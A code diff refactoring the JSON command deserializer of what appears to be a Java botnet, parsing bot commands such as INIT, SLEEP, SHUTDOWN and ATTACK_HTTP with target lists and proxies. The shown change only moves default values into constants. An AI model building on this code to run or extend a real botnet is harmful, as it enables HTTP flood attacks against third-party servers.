@@ -28,7 +28,7 @@ package com.acmutv.botnet.core.command.json;
 
 import com.acmutv.botnet.config.AppConfigurationService;
 import com.acmutv.botnet.config.util.TemplateEngine;
-import com.acmutv.botnet.core.attack.HttpAttackMethod;
+import com.acmutv.botnet.core.attack.http.HttpAttackMethod;
 import com.acmutv.botnet.core.command.BotCommand;
 import com.acmutv.botnet.core.command.CommandScope;
 import com.acmutv.botnet.core.target.HttpTarget;
@@ -60,6 +60,41 @@ import java.util.concurrent.TimeUnit;
 public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
 
   private static final Logger LOGGER = LogManager.getLogger(BotCommandDeserializer.class);
+
+  /**
+   * Default resource for command `INIT`.
+   */
+  private static final String DEFAULT_INIT_RESOURCE = AppConfigurationService.getConfigurations().getInitResource();
+
+  /**
+   * Default settings for command `SET`.
+   */
+  private static final Map<String,String> DEFAULT_SET_SETTINGS = new HashMap<>();
+
+  /**
+   * Default timeout for command `SLEEP`.
+   */
+  private static final Duration DEFAULT_SLEEP_TIMEOUT = new Duration(60, TimeUnit.SECONDS);
+
+  /**
+   * Default timeout for command `SHUTDOWN`.
+   */
+  private static final Duration DEFAULT_SHUTDOWN_TIMEOUT = new Duration(60, TimeUnit.SECONDS);
+
+  /**
+   * Default method for command `ATTACK_HTTP`.
+   */
+  private static final HttpAttackMethod DEFAULT_ATTACK_HTTP_METHOD = HttpAttackMethod.GET;
+
+  /**
+   * Default targets for command `ATTACK_HTTP`.
+   */
+  private static final List<HttpTarget> DEFAULT_ATTACK_HTTP_TARGETS = new ArrayList<>();
+
+  /**
+   * Default proxy for command `ATTACK_HTTP`.
+   */
+  private static final HttpTargetProxy DEFAULT_ATTACK_HTTP_PROXY = null;
 
   /**
    * The singleton of {@link BotCommandDeserializer}.
@@ -102,51 +137,52 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
       switch (cmd.getScope()) {
 
         case INIT:
-          final String resourceDefault = AppConfigurationService.getConfigurations().getInitResource();
           final String resource = (node.has("resource")) ?
-              TemplateEngine.getInstance().replace(node.get("resource").asText()) : resourceDefault;
+              TemplateEngine.getInstance().replace(node.get("resource").asText())
+              :
+              DEFAULT_INIT_RESOURCE;
           cmd.getParams().put("resource", resource);
           break;
 
         case SET:
-          final Map<String,String> settingsDefault = new HashMap<>();
           final Map<String,String> settings = (node.has("settings")) ?
-              parseMapStringString(node.get("settings")) : settingsDefault;
+              parseMapStringString(node.get("settings"))
+              :
+              DEFAULT_SET_SETTINGS;
           cmd.getParams().put("settings", settings);
           break;
 
         case SLEEP:
-          final Duration sleepTimeoutDefault = new Duration(60, TimeUnit.SECONDS);
           final Duration sleepTimeout = (node.has("timeout")) ?
-              parseObject(node.get("timeout"), Duration.class) : sleepTimeoutDefault;
+              parseObject(node.get("timeout"), Duration.class)
+              :
+              DEFAULT_SLEEP_TIMEOUT;
           cmd.getParams().put("timeout", sleepTimeout);
           break;
 
         case SHUTDOWN:
-          final Duration shutdownTimeoutDefault = new Duration(60, TimeUnit.SECONDS);
           final Duration shutdownTimeout = (node.has("timeout")) ?
-              parseObject(node.get("timeout"), Duration.class) : shutdownTimeoutDefault;
+              parseObject(node.get("timeout"), Duration.class)
+              :
+              DEFAULT_SHUTDOWN_TIMEOUT;
           cmd.getParams().put("timeout", shutdownTimeout);
           break;
 
         case ATTACK_HTTP:
-          final HttpAttackMethod httpMethodDefault = HttpAttackMethod.GET;
-          final List<HttpTarget> httpTargetsDefault = new ArrayList<>();
-          final HttpTargetProxy httpProxyDefault = null;
-
-          final HttpAttackMethod httpMethod = (node.has("method")) ?
-              HttpAttackMethod.from(node.get("method").asText(httpMethodDefault.name()))
+          final HttpAttackMethod httpAttackMethod = (node.has("method")) ?
+              HttpAttackMethod.from(node.get("method").asText())
               :
-              httpMethodDefault;
+              DEFAULT_ATTACK_HTTP_METHOD;
           final List<HttpTarget> httpTargets = (node.has("targets")) ?
               parseList(node.get("targets"), HttpTarget.class)
               :
-              httpTargetsDefault;
+              DEFAULT_ATTACK_HTTP_TARGETS;
           final HttpTargetProxy httpProxy = (node.has("proxy")) ?
               parseObject(node.get("proxy"), HttpTargetProxy.class)
               :
-              httpProxyDefault;
-          cmd.getParams().put("method", httpMethod);
+              DEFAULT_ATTACK_HTTP_PROXY;
+
+          cmd.getParams().put("method", httpAttackMethod);
           cmd.getParams().put("targets", httpTargets);
           cmd.getParams().put("proxy", httpProxy);
           break;
